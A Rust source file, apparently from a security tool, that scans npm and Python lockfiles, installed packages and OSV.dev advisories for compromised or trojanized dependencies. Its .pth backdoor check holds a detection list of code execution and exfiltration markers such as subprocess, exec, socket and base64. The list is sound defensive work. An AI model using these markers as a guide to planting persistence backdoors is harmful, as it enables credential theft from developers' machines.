//! Supply-chain attack scanner orchestrator.
//!
//! Direct port of the engine half of `packages/arcis-python/arcis/cli/sca.py`:
//!   * `_scan_package_lock` (lockfile v1 + v2/v3)
//!   * `_scan_yarn_lock`
//!   * `_scan_node_modules`
//!   * `_scan_requirements` (requirements.txt, poetry.lock, Pipfile.lock)
//!   * `_scan_pip_installed` (pip list subprocess)
//!   * `_scan_pth_backdoors` (site-packages persistence artifacts)
//!   * `discover_manifests` + `scan_project` (orchestrator + dedup)
//!
//! Output formatting (color, headers, summary) lives in the `arcis-cli`
//! crate next to the clap glue. This module only produces structured
//! `Finding`s.

use std::collections::HashSet;
use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::Duration;

use regex::Regex;
use serde::Serialize;

use crate::osv::{self, OsvVuln};
use crate::osv_cache::{cache_key, OsvCache, DEFAULT_TTL_SECS};
use crate::threat_db::{is_compromised, normalize_name, Threat};
use crate::{sca_graph, sca_lockfile, sca_postinstall};

/// One finding row. Field-for-field with the Python `Finding` dataclass.
///
/// # JSON contract
///
/// `Serialize` is derived with `rename_all = "camelCase"` so the new
/// `paths` / `path_count` fields surface as `paths` and `pathCount` —
/// matching the existing camelCase convention used by `arcis scan
/// --json` (`durationMs`, `routesTotal`) and `arcis audit --json`. No
/// user-facing `arcis sca --json` mode exists yet, but locking the
/// schema now prevents a rename when one ships.
///
/// # Path metadata semantics
///
/// `paths` and `path_count` are only populated by
/// [`scan_project_with_paths`] and [`scan_project_with_osv_paths`]; the
/// pre-existing [`scan_project`] / [`scan_project_with_osv`] flows leave
/// them empty/zero so callers that don't care about transitive depth
/// don't pay the graph-build cost. Invariant: `path_count == paths.len()`
/// after annotation; `0` / `Vec::new()` means "no path data attached".
///
/// `paths` lists every shortest root → parent chain (target excluded);
/// see [`crate::sca_graph::DepGraph::all_paths_to`] for tie-break and
/// cap behaviour.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Finding {
    pub package: String,
    pub ecosystem: String,
    pub version: String,
    pub severity: String,
    pub location: String,
    pub attack_vector: String,
    pub remediation: String,
    pub source: String,
    pub references: Vec<String>,
    pub finding_type: FindingType,
    /// Shortest root → parent chains for this finding. Each inner vec
    /// is package names target-excluded; depth equals `paths[i].len()`.
    /// Empty when no graph was available (Pipfile.lock / yarn Berry /
    /// the legacy non-paths entry points).
    pub paths: Vec<Vec<String>>,
    /// Number of distinct paths discovered, equal to `paths.len()`.
    /// Kept as a separate field so JSON consumers don't have to
    /// `.length` the array client-side, and so future variants can
    /// summarise (e.g. expose count without the chain when a flag
    /// trims the array).
    pub path_count: usize,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingType {
    /// Standard hit: an exact malicious version or a vulnerable range.
    CompromisedVersion,
    /// Trojanized dependency pulled in by a poisoned package.
    TrojanizedDep,
    /// Persistence artifact (e.g. a malicious `.pth` file).
    PersistenceArtifact,
}

impl FindingType {
    pub fn label(self) -> &'static str {
        match self {
            Self::CompromisedVersion => "compromised_version",
            Self::TrojanizedDep => "trojanized_dep",
            Self::PersistenceArtifact => "persistence_artifact",
        }
    }
}

// ── manifest discovery ────────────────────────────────────────────────────

/// Manifest names the scanner knows how to recognise. The order is the
/// order Python's `discover_manifests` returns, which the report header
/// consumes verbatim.
const MANIFEST_NAMES: &[&str] = &[
    "package-lock.json",
    "yarn.lock",
    "pnpm-lock.yaml",
    "node_modules",
    "requirements.txt",
    "Pipfile.lock",
    "poetry.lock",
];

/// List supported manifests / lockfiles that exist under `path`.
pub fn discover_manifests(path: &Path) -> Vec<PathBuf> {
    let mut found = Vec::new();
    for name in MANIFEST_NAMES {
        let candidate = path.join(name);
        if candidate.exists() {
            found.push(candidate);
        }
    }
    found
}

// ── npm / Node.js scanners ────────────────────────────────────────────────

fn scan_package_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lockfile = path.join("package-lock.json");
    if !lockfile.is_file() {
        return findings;
    }
    let bytes = match fs::read(&lockfile) {
        Ok(b) => b,
        Err(_) => return findings,
    };
    let data: serde_json::Value = match serde_json::from_slice(&bytes) {
        Ok(v) => v,
        Err(_) => return findings,
    };
    let location = lockfile.display().to_string();

    let packages = data
        .get("packages")
        .and_then(|v| v.as_object())
        .cloned()
        .unwrap_or_default();
    let dependencies = data
        .get("dependencies")
        .and_then(|v| v.as_object())
        .cloned()
        .unwrap_or_default();

    for threat in threats {
        if threat.ecosystem != "npm" {
            continue;
        }
        let threat_norm = normalize_name(&threat.name, "npm");
        let trojanized_norm: HashSet<String> = threat
            .trojanized_deps
            .iter()
            .map(|d| normalize_name(d, "npm"))
            .collect();

        // v2/v3: keys are paths like "node_modules/<name>" or
        // "node_modules/<a>/node_modules/<b>". We extract the segment after
        // the last `node_modules/`.
        for (pkg_path, pkg_info) in &packages {
            let pkg_name = match pkg_path.rsplit_once("node_modules/") {
                Some((_, name)) => name,
                None => "",
            };
            let pkg_norm = normalize_name(pkg_name, "npm");
            let version = pkg_info
                .get("version")
                .and_then(|v| v.as_str())
                .unwrap_or("");

            if pkg_norm == threat_norm && is_compromised(version, threat) {
                findings.push(Finding {
                    package: threat.name.clone(),
                    ecosystem: "npm".into(),
                    version: version.to_string(),
                    severity: threat.severity.clone(),
                    location: location.clone(),
                    attack_vector: threat.attack_vector.clone(),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::CompromisedVersion,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }

            if trojanized_norm.contains(&pkg_norm) {
                findings.push(Finding {
                    package: pkg_name.to_string(),
                    ecosystem: "npm".into(),
                    version: version.to_string(),
                    severity: threat.severity.clone(),
                    location: location.clone(),
                    attack_vector: format!(
                        "Trojanized dependency of {}: {}",
                        threat.name, threat.attack_vector
                    ),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::TrojanizedDep,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }
        }

        // v1: dependencies dict, key is the package name directly.
        for (dep_name, dep_info) in &dependencies {
            let dep_norm = normalize_name(dep_name, "npm");
            let version = dep_info
                .get("version")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if dep_norm == threat_norm && is_compromised(version, threat) {
                findings.push(Finding {
                    package: threat.name.clone(),
                    ecosystem: "npm".into(),
                    version: version.to_string(),
                    severity: threat.severity.clone(),
                    location: location.clone(),
                    attack_vector: threat.attack_vector.clone(),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::CompromisedVersion,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }
        }
    }
    findings
}

fn scan_yarn_lock(path: &Path, threats: &[Threat]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let lockfile = path.join("yarn.lock");
    if !lockfile.is_file() {
        return findings;
    }
    let content = match fs::read_to_string(&lockfile) {
        Ok(s) => s,
        Err(_) => return findings,
    };
    let location = lockfile.display().to_string();

    for threat in threats {
        if threat.ecosystem != "npm" {
            continue;
        }
        // Equivalent of Python's r'"<name>@[^"]*".*?version\s+"([^"]+)"'
        // with DOTALL so the body can span lines.
        let pattern = format!(
            r#""{name}@[^"]*"[\s\S]*?version\s+"([^"]+)""#,
            name = regex::escape(&threat.name),
        );
        let block_re = match Regex::new(&pattern) {
            Ok(r) => r,
            Err(_) => continue,
        };
        for caps in block_re.captures_iter(&content) {
            let found_ver = caps.get(1).map(|m| m.as_str()).unwrap_or("");
            if is_compromised(found_ver, threat) {
                findings.push(Finding {
                    package: threat.name.clone(),
                    ecosystem: "npm".into(),
                    version: found_ver.to_string(),
                    severity: threat.severity.clone(),
                    location: location.clone(),
                    attack_vector: threat.attack_vector.clone(),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::CompromisedVersion,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }
        }
        // Trojanized deps: just substring search like the Python version.
        for dep_name in &threat.trojanized_deps {
            if content.contains(dep_name.as_str()) {
                findings.push(Finding {
                    package: dep_name.clone(),
                    ecosystem: "npm".into(),
                    version: "unknown".into(),
                    severity: threat.severity.clone(),
                    location: location.clone(),
                    attack_vector: format!(
                        "Trojanized dependency of {}: {}",
                        threat.name, threat.attack_vector
                    ),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::TrojanizedDep,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }
        }
    }
    findings
}

fn scan_node_modules(path: &Path, threats: &[Threat]) -> Vec<Finding> {
    let mut findings = Vec::new();
    let nm = path.join("node_modules");
    if !nm.is_dir() {
        return findings;
    }
    for threat in threats {
        if threat.ecosystem != "npm" {
            continue;
        }
        let pkg_json = nm.join(&threat.name).join("package.json");
        if pkg_json.is_file() {
            if let Ok(bytes) = fs::read(&pkg_json) {
                if let Ok(data) = serde_json::from_slice::<serde_json::Value>(&bytes) {
                    let version = data.get("version").and_then(|v| v.as_str()).unwrap_or("");
                    if is_compromised(version, threat) {
                        findings.push(Finding {
                            package: threat.name.clone(),
                            ecosystem: "npm".into(),
                            version: version.to_string(),
                            severity: threat.severity.clone(),
                            location: pkg_json.display().to_string(),
                            attack_vector: threat.attack_vector.clone(),
                            remediation: threat.remediation.clone(),
                            source: threat.source.clone(),
                            references: threat.references.clone(),
                            finding_type: FindingType::CompromisedVersion,
                            paths: Vec::new(),
                            path_count: 0,
                        });
                    }
                }
            }
        }
        for dep_name in &threat.trojanized_deps {
            let dep_json = nm.join(dep_name).join("package.json");
            if dep_json.is_file() {
                findings.push(Finding {
                    package: dep_name.clone(),
                    ecosystem: "npm".into(),
                    version: "installed".into(),
                    severity: threat.severity.clone(),
                    location: dep_json.display().to_string(),
                    attack_vector: format!(
                        "Trojanized dependency of {}: {}",
                        threat.name, threat.attack_vector
                    ),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::TrojanizedDep,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }
        }
    }
    findings
}

// ── Python / PyPI scanners ────────────────────────────────────────────────

const REQ_FILES: &[&str] = &[
    "requirements.txt",
    "requirements-dev.txt",
    "requirements-prod.txt",
];

fn scan_requirements(path: &Path, threats: &[Threat]) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Match `pkg [extras] ==1.2.3 [...]`. Python regex was:
    //   ^\s*([A-Za-z0-9_.\-]+)\s*(?:\[[^\]]*\])?\s*==\s*([^\s;#]+)
    let req_re = Regex::new(r"^\s*([A-Za-z0-9_.\-]+)\s*(?:\[[^\]]*\])?\s*==\s*([^\s;#]+)")
        .expect("requirements regex must compile");

    for req_name in REQ_FILES {
        let req_file = path.join(req_name);
        if !req_file.is_file() {
            continue;
        }
        let location = req_file.display().to_string();
        let content = match fs::read_to_string(&req_file) {
            Ok(s) => s,
            Err(_) => continue,
        };
        for line in content.lines() {
            let caps = match req_re.captures(line) {
                Some(c) => c,
                None => continue,
            };
            let pkg_name = normalize_name(&caps[1], "pypi");
            let pkg_ver = caps[2].trim().to_string();
            for threat in threats {
                if threat.ecosystem != "pypi" {
                    continue;
                }
                if normalize_name(&threat.name, "pypi") != pkg_name {
                    continue;
                }
                if is_compromised(&pkg_ver, threat) {
                    findings.push(Finding {
                        package: threat.name.clone(),
                        ecosystem: "pypi".into(),
                        version: pkg_ver.clone(),
                        severity: threat.severity.clone(),
                        location: location.clone(),
                        attack_vector: threat.attack_vector.clone(),
                        remediation: threat.remediation.clone(),
                        source: threat.source.clone(),
                        references: threat.references.clone(),
                        finding_type: FindingType::CompromisedVersion,
                        paths: Vec::new(),
                        path_count: 0,
                    });
                }
            }
        }
    }

    // poetry.lock: parse all `[[package]]` blocks via the same regex shape.
    let poetry_lock = path.join("poetry.lock");
    if poetry_lock.is_file() {
        if let Ok(content) = fs::read_to_string(&poetry_lock) {
            let block_re = Regex::new(
                r#"\[\[package\]\][\s\S]*?name\s*=\s*"([^"]+)"[\s\S]*?version\s*=\s*"([^"]+)""#,
            )
            .expect("poetry block regex must compile");
            let location = poetry_lock.display().to_string();
            for caps in block_re.captures_iter(&content) {
                let pkg_name = normalize_name(&caps[1], "pypi");
                let pkg_ver = caps[2].to_string();
                for threat in threats {
                    if threat.ecosystem != "pypi" {
                        continue;
                    }
                    if normalize_name(&threat.name, "pypi") != pkg_name {
                        continue;
                    }
                    if is_compromised(&pkg_ver, threat) {
                        findings.push(Finding {
                            package: threat.name.clone(),
                            ecosystem: "pypi".into(),
                            version: pkg_ver.clone(),
                            severity: threat.severity.clone(),
                            location: location.clone(),
                            attack_vector: threat.attack_vector.clone(),
                            remediation: threat.remediation.clone(),
                            source: threat.source.clone(),
                            references: threat.references.clone(),
                            finding_type: FindingType::CompromisedVersion,
                            paths: Vec::new(),
                            path_count: 0,
                        });
                    }
                }
            }
        }
    }

    // Pipfile.lock: walk default + develop sections.
    let pipfile = path.join("Pipfile.lock");
    if pipfile.is_file() {
        if let Ok(bytes) = fs::read(&pipfile) {
            if let Ok(data) = serde_json::from_slice::<serde_json::Value>(&bytes) {
                let location = pipfile.display().to_string();
                for section in ["default", "develop"] {
                    let pkgs = match data.get(section).and_then(|v| v.as_object()) {
                        Some(o) => o,
                        None => continue,
                    };
                    for (raw_name, pkg_info) in pkgs {
                        let pkg_name = normalize_name(raw_name, "pypi");
                        let raw_ver = pkg_info
                            .get("version")
                            .and_then(|v| v.as_str())
                            .unwrap_or("");
                        let version = raw_ver.trim_start_matches('=').to_string();
                        for threat in threats {
                            if threat.ecosystem != "pypi" {
                                continue;
                            }
                            if normalize_name(&threat.name, "pypi") != pkg_name {
                                continue;
                            }
                            if is_compromised(&version, threat) {
                                findings.push(Finding {
                                    package: threat.name.clone(),
                                    ecosystem: "pypi".into(),
                                    version: version.clone(),
                                    severity: threat.severity.clone(),
                                    location: location.clone(),
                                    attack_vector: threat.attack_vector.clone(),
                                    remediation: threat.remediation.clone(),
                                    source: threat.source.clone(),
                                    references: threat.references.clone(),
                                    finding_type: FindingType::CompromisedVersion,
                                    paths: Vec::new(),
                                    path_count: 0,
                                });
                            }
                        }
                    }
                }
            }
        }
    }
    findings
}

fn scan_pip_installed(threats: &[Threat]) -> Vec<Finding> {
    let mut findings = Vec::new();
    // Mirror Python's `[sys.executable, "-m", "pip", "list", "--format=json"]`.
    // We don't have a `sys.executable` equivalent in Rust; use the `python3`
    // binary on PATH (matches what shipping environments expose). If it's
    // missing or non-zero, fall back silently like the Python original.
    let candidates = ["python3", "python"];
    let mut output = None;
    for bin in candidates {
        match Command::new(bin)
            .args(["-m", "pip", "list", "--format=json"])
            .output()
        {
            Ok(o) if o.status.success() => {
                output = Some(o);
                break;
            }
            _ => continue,
        }
    }
    let Some(output) = output else {
        return findings;
    };
    let pkgs: Vec<serde_json::Value> = match serde_json::from_slice(&output.stdout) {
        Ok(v) => v,
        Err(_) => return findings,
    };
    for pkg in pkgs {
        let pkg_name = normalize_name(
            pkg.get("name").and_then(|v| v.as_str()).unwrap_or(""),
            "pypi",
        );
        let pkg_version = pkg
            .get("version")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        for threat in threats {
            if threat.ecosystem != "pypi" {
                continue;
            }
            if normalize_name(&threat.name, "pypi") != pkg_name {
                continue;
            }
            if is_compromised(&pkg_version, threat) {
                findings.push(Finding {
                    package: threat.name.clone(),
                    ecosystem: "pypi".into(),
                    version: pkg_version.clone(),
                    severity: threat.severity.clone(),
                    location: "pip (currently installed)".into(),
                    attack_vector: threat.attack_vector.clone(),
                    remediation: threat.remediation.clone(),
                    source: threat.source.clone(),
                    references: threat.references.clone(),
                    finding_type: FindingType::CompromisedVersion,
                    paths: Vec::new(),
                    path_count: 0,
                });
            }
        }
    }
    findings
}

fn scan_pth_backdoors() -> Vec<Finding> {
    // Suspicious patterns in .pth files (code execution, exfil). Same list
    // as the Python version.
    let suspicious = [
        r"import\s+os",
        r"import\s+subprocess",
        r"exec\s*\(",
        r"eval\s*\(",
        r"__import__",
        r"requests\.",
        r"urllib",
        r"socket\.",
        r"base64\.",
    ];
    let patterns: Vec<Regex> = suspicious
        .iter()
        .filter_map(|p| Regex::new(p).ok())
        .collect();

    let mut findings = Vec::new();
    let site_dirs = locate_site_packages();

    for site_dir in site_dirs {
        let entries = match fs::read_dir(&site_dir) {
            Ok(e) => e,
            Err(_) => continue,
        };
        for entry in entries.flatten() {
            let p = entry.path();
            if p.extension().and_then(|s| s.to_str()) != Some("pth") {
                continue;
            }
            let content = match fs::read_to_string(&p) {
                Ok(s) => s,
                Err(_) => continue,
            };
            for re in &patterns {
                if re.is_match(&content) {
                    findings.push(Finding {
                        package: "unknown".into(),
                        ecosystem: "pypi".into(),
                        version: "n/a".into(),
                        severity: "critical".into(),
                        location: p.display().to_string(),
                        attack_vector: "Suspicious .pth file with code execution detected. \
                            This may be a persistence backdoor from the litellm supply chain attack. \
                            .pth files in site-packages execute on every Python startup."
                            .into(),
                        remediation: format!(
                            "1. Inspect the file: {}\n2. If you don't recognize it, delete it immediately\n3. Rotate all credentials accessible from this machine",
                            p.display()
                        ),
                        source: "Arcis Security Research".into(),
                        references: vec![
                            "https://github.com/BerriAI/litellm/security/advisories".into(),
                        ],
                        finding_type: FindingType::PersistenceArtifact, paths: Vec::new(), path_count: 0,
                    });
                    break;
                }
            }
        }
    }
    findings
}

fn locate_site_packages() -> Vec<PathBuf> {
    let candidates = ["python3", "python"];
    for bin in candidates {
        let out = Command::new(bin)
            .args([
                "-c",
                "import json,site; \
                 dirs = list(site.getsitepackages()); \
                 user = site.getusersitepackages(); \
                 dirs.append(user) if isinstance(user, str) else None; \
                 print(json.dumps(dirs))",
            ])
            .output();
        match out {
            Ok(o) if o.status.success() => {
                if let Ok(dirs) = serde_json::from_slice::<Vec<String>>(&o.stdout) {
                    return dirs.into_iter().map(PathBuf::from).collect();
                }
            }
            _ => continue,
        }
    }
    Vec::new()
}

// ── unified scanner ───────────────────────────────────────────────────────

/// Run every check against `path`. When `check_system` is set, also scan
/// globally installed pip packages and walk site-packages for `.pth`
/// persistence artifacts.
///
/// The postinstall sweep runs unconditionally: it walks only the
/// project-local `node_modules/` (and the explicit `.pnpm` store path),
/// so there's no system-side cost the way the `.pth` site-packages walk
/// has — gating it behind `check_system` would silently miss the very
/// supply-chain attacks SCA exists to catch.
///
/// Findings are deduplicated by `(package, version, location)` to mirror
/// Python's `seen` set.
pub fn scan_project(path: &Path, check_system: bool, threats: &[Threat]) -> Vec<Finding> {
    let mut findings = Vec::new();
    findings.extend(scan_package_lock(path, threats));
    findings.extend(scan_yarn_lock(path, threats));
    findings.extend(scan_node_modules(path, threats));
    findings.extend(sca_postinstall::scan_postinstall_backdoors(path));
    findings.extend(scan_requirements(path, threats));
    if check_system {
        findings.extend(scan_pip_installed(threats));
        findings.extend(scan_pth_backdoors());
    }

    let mut seen: HashSet<(String, String, String)> = HashSet::new();
    let mut unique = Vec::with_capacity(findings.len());
    for f in findings {
        let key = (f.package.clone(), f.version.clone(), f.location.clone());
        if seen.insert(key) {
            unique.push(f);
        }
    }
    unique
}

// ── OSV augmentation layer ────────────────────────────────────────────────
//
// Designed in `documents/plans/cli-sca.md` Phase B (2026-05-07): the
// embedded threat-db.json stays curated; this layer queries OSV.dev for
// every package the project pulls in, with a per-user 24h cache at
// `~/.arcis/osv-cache.json`. Findings from both layers merge in
// `scan_project_with_osv`, deduplicated by `(package, version, location)`
// so the embedded entry wins when both layers report the same hit.

/// Flat description of one installed package, used as input to the OSV
/// query layer. Carries the same `(ecosystem, name, version, location)`
/// tuple OSV needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageRef {
    pub ecosystem: String,
    pub name: String,
    pub version: String,
    pub location: String,
}

/// Walk every supported lockfile under `path` and emit one `PackageRef`
/// per installed package. The embedded scan iterates threats × packages,
/// so it doesn't need this list — the OSV layer does, since it queries
/// each package independently.
pub fn enumerate_packages(path: &Path) -> Vec<PackageRef> {
    let mut out = Vec::new();
    enumerate_package_lock(path, &mut out);
    enumerate_yarn_lock(path, &mut out);
    enumerate_requirements(path, &mut out);
    enumerate_poetry_lock(path, &mut out);
    enumerate_pipfile_lock(path, &mut out);

    let mut seen: HashSet<(String, String, String)> = HashSet::new();
    out.retain(|p| seen.insert((p.ecosystem.clone(), p.name.clone(), p.version.clone())));
    out
}

fn enumerate_package_lock(path: &Path, out: &mut Vec<PackageRef>) {
    let lockfile = path.join("package-lock.json");
    if !lockfile.is_file() {
        return;
    }
    let bytes = match fs::read(&lockfile) {
        Ok(b) => b,
        Err(_) => return,
    };
    let data: serde_json::Value = match serde_json::from_slice(&bytes) {
        Ok(v) => v,
        Err(_) => return,
    };
    let location = lockfile.display().to_string();

    if let Some(packages) = data.get("packages").and_then(|v| v.as_object()) {
        for (pkg_path, pkg_info) in packages {
            let name = match pkg_path.rsplit_once("node_modules/") {
                Some((_, n)) => n,
                None => continue,
            };
            if name.is_empty() {
                continue;
            }
            let version = pkg_info
                .get("version")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            if version.is_empty() {
                continue;
            }
            out.push(PackageRef {
                ecosystem: "npm".into(),
                name: name.into(),
                version: version.into(),
                location: location.clone(),
            });
        }
    }
    if let Some(deps) = data.get("dependencies").and_then(|v| v.as_object()) {
        for (name, info) in deps {
            let version = info.get("version").and_then(|v| v.as_str()).unwrap_or("");
            if version.is_empty() {
                continue;
            }
            out.push(PackageRef {
                ecosystem: "npm".into(),
                name: name.clone(),
                version: version.into(),
                location: location.clone(),
            });
        }
    }
}

fn enumerate_yarn_lock(path: &Path, out: &mut Vec<PackageRef>) {
    let lockfile = path.join("yarn.lock");
    if !lockfile.is_file() {
        return;
    }
    let content = match fs::read_to_string(&lockfile) {
        Ok(s) => s,
        Err(_) => return,
    };
    let location = lockfile.display().to_string();
    let block_re = Regex::new(r#""((?:@[^/]+/)?[^"@]+)@[^"]*"\s*[\s\S]*?version\s+"([^"]+)""#)
        .expect("yarn block regex must compile");
    for caps in block_re.captures_iter(&content) {
        out.push(PackageRef {
            ecosystem: "npm".into(),
            name: caps[1].to_string(),
            version: caps[2].to_string(),
            location: location.clone(),
        });
    }
}

fn enumerate_requirements(path: &Path, out: &mut Vec<PackageRef>) {
    let req_re = Regex::new(r"^\s*([A-Za-z0-9_.\-]+)\s*(?:\[[^\]]*\])?\s*==\s*([^\s;#]+)")
        .expect("requirements regex must compile");
    for fname in REQ_FILES {
        let req_file = path.join(fname);
        if !req_file.is_file() {
            continue;
        }
        let content = match fs::read_to_string(&req_file) {
            Ok(s) => s,
            Err(_) => continue,
        };
        let location = req_file.display().to_string();
        for line in content.lines() {
            if let Some(caps) = req_re.captures(line) {
                out.push(PackageRef {
                    ecosystem: "pypi".into(),
                    name: caps[1].to_string(),
                    version: caps[2].trim().to_string(),
                    location: location.clone(),
                });
            }
        }
    }
}

fn enumerate_poetry_lock(path: &Path, out: &mut Vec<PackageRef>) {
    let lockfile = path.join("poetry.lock");
    if !lockfile.is_file() {
        return;
    }
    let content = match fs::read_to_string(&lockfile) {
        Ok(s) => s,
        Err(_) => return,
    };
    let location = lockfile.display().to_string();
    let block_re =
        Regex::new(r#"\[\[package\]\][\s\S]*?name\s*=\s*"([^"]+)"[\s\S]*?version\s*=\s*"([^"]+)""#)
            .expect("poetry block regex must compile");
    for caps in block_re.captures_iter(&content) {
        out.push(PackageRef {
            ecosystem: "pypi".into(),
            name: caps[1].to_string(),
            version: caps[2].to_string(),
            location: location.clone(),
        });
    }
}

fn enumerate_pipfile_lock(path: &Path, out: &mut Vec<PackageRef>) {
    let lockfile = path.join("Pipfile.lock");
    if !lockfile.is_file() {
        return;
    }
    let bytes = match fs::read(&lockfile) {
        Ok(b) => b,
        Err(_) => return,
    };
    let data: serde_json::Value = match serde_json::from_slice(&bytes) {
        Ok(v) => v,
        Err(_) => return,
    };
    let location = lockfile.display().to_string();
    for section in ["default", "develop"] {
        let pkgs = match data.get(section).and_then(|v| v.as_object()) {
            Some(o) => o,
            None => continue,
        };
        for (raw_name, info) in pkgs {
            let raw_ver = info.get("version").and_then(|v| v.as_str()).unwrap_or("");
            let version = raw_ver.trim_start_matches('=').to_string();
            if version.is_empty() {
                continue;
            }
            out.push(PackageRef {
                ecosystem: "pypi".into(),
                name: raw_name.clone(),
                version,
                location: location.clone(),
            });
        }
    }
}

/// Adapter: turn one OSV vuln + the package it was queried for into a
/// `Finding` row that renders identically to embedded-DB findings. The
/// `source` field carries `osv:<id>` so the renderer can attribute the
/// row to OSV; `attack_vector` reuses the OSV `summary` so the user
/// gets a one-line reason without paging out to the URL.
pub fn osv_to_finding(pkg: &PackageRef, vuln: &OsvVuln) -> Finding {
    let severity = osv::rank_severity(&vuln.severity);
    let attack_vector = if vuln.summary.is_empty() {
        format!("OSV advisory {} (no summary).", vuln.id)
    } else {
        vuln.summary.clone()
    };
    let references: Vec<String> = vuln
        .references
        .iter()
        .map(|r| r.url.clone())
        .filter(|s| !s.is_empty())
        .collect();

    Finding {
        package: pkg.name.clone(),
        ecosystem: pkg.ecosystem.clone(),
        version: pkg.version.clone(),
        severity: severity.to_string(),
        location: pkg.location.clone(),
        attack_vector,
        remediation: format!(
            "Review advisory {} and upgrade to a non-affected version.",
            vuln.id
        ),
        source: format!("osv:{}", vuln.id),
        references,
        finding_type: FindingType::CompromisedVersion,
        paths: Vec::new(),
        path_count: 0,
    }
}

/// Caller-supplied options for the OSV augmentation layer.
#[derive(Debug, Clone)]
pub struct OsvOptions {
    /// Where to read/write the cache. None disables persistence — the
    /// run still queries OSV but nothing is stored across invocations.
    pub cache_path: Option<PathBuf>,
    /// When false, ignore any cached answers and refetch (`--no-cache`).
    pub use_cache: bool,
    /// When true, ONLY consult the cache — never hit the network. Used
    /// by tests and by ergonomics paths where the user wants no network
    /// I/O at all but still wants OSV-curated entries from a previous
    /// fresh run.
    pub offline: bool,
    /// Per-request HTTP timeout. The CLI defaults to 5s.
    pub timeout: Duration,
}

impl Default for OsvOptions {
    fn default() -> Self {
        Self {
            cache_path: OsvCache::default_path(),
            use_cache: true,
            offline: false,
            timeout: Duration::from_secs(5),
        }
    }
}

/// Run the embedded scanner first, then augment with OSV findings if the
/// caller requests it. Returns the merged + deduplicated finding list.
///
/// Deduplication key is `(package, version, location)` — same as the
/// embedded scanner — so when both layers find the same hit the embedded
/// entry wins (it has the better-curated `attack_vector` + `remediation`
/// strings). Pure OSV-only hits flow through unchanged.
pub fn scan_project_with_osv(
    path: &Path,
    check_system: bool,
    threats: &[Threat],
    osv_opts: &OsvOptions,
) -> Vec<Finding> {
    let mut findings = scan_project(path, check_system, threats);

    let packages = enumerate_packages(path);
    let osv_findings = augment_with_osv(&packages, osv_opts);
    findings.extend(osv_findings);

    let mut seen: HashSet<(String, String, String)> = HashSet::new();
    let mut unique = Vec::with_capacity(findings.len());
    for f in findings {
        let key = (f.package.clone(), f.version.clone(), f.location.clone());
        if seen.insert(key) {
            unique.push(f);
        }
    }
    unique
}

/// Resolve OSV vulns for every `PackageRef` and convert the responses
/// into `Finding`s. Public so tests + alternate front-ends (e.g. the
/// future SARIF emitter) can reuse the same plumbing without touching
/// `scan_project_with_osv`.
pub fn augment_with_osv(packages: &[PackageRef], opts: &OsvOptions) -> Vec<Finding> {
    if packages.is_empty() {
        return Vec::new();
    }

    let mut cache = match (&opts.cache_path, opts.use_cache) {
        (Some(p), true) => OsvCache::load(p),
        _ => OsvCache::empty(),
    };

    // Offline mode: cache-only, no network, no runtime.
    if opts.offline {
        return packages
            .iter()
            .filter_map(|pkg| {
                let key = cache_key(&pkg.ecosystem, &pkg.name, &pkg.version);
                let vulns = cache.get(&key, DEFAULT_TTL_SECS)?.to_vec();
                Some(
                    vulns
                        .iter()
                        .map(|v| osv_to_finding(pkg, v))
                        .collect::<Vec<_>>(),
                )
            })
            .flatten()
            .collect();
    }

    // Online mode: build a single-thread tokio runtime + reqwest client
    // for the duration of the augmentation pass. We don't need the
    // multi-thread runtime that `arcis scan` uses — OSV serializes
    // surprisingly well, and most users have <50 packages to query.
    let runtime = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(_) => return Vec::new(),
    };

    let timeout = opts.timeout;
    let use_cache = opts.use_cache;
    let mut findings: Vec<Finding> = Vec::new();

    runtime.block_on(async {
        let client = match reqwest::Client::builder().build() {
            Ok(c) => c,
            Err(_) => return,
        };

        for pkg in packages {
            let key = cache_key(&pkg.ecosystem, &pkg.name, &pkg.version);

            // Cache hit short-circuits the network call entirely.
            if use_cache {
                if let Some(cached) = cache.get(&key, DEFAULT_TTL_SECS) {
                    for v in cached {
                        findings.push(osv_to_finding(pkg, v));
                    }
                    continue;
                }
            }

            let vulns: Vec<OsvVuln> =
                match osv::query(&client, &pkg.ecosystem, &pkg.name, &pkg.version, timeout).await {
                    Ok(v) => v,
                    Err(_) => continue,
                };

            for v in &vulns {
                findings.push(osv_to_finding(pkg, v));
            }
            if use_cache {
                cache.put(key, vulns);
            }
        }
    });

    if let (Some(p), true) = (&opts.cache_path, opts.use_cache) {
        cache.prune_stale(DEFAULT_TTL_SECS);
        let _ = cache.save(p);
    }

    findings
}

// ── transitive depth annotation layer (cli-sca.md Phase C item 5) ────────

/// Default cap on the number of distinct shortest paths recorded per
/// finding. Bounds output size on diamond-heavy graphs; see
/// [`crate::sca_graph::DepGraph::all_paths_to`] for the empirical
/// rationale.
pub const DEFAULT_PATH_CAP: usize = 8;

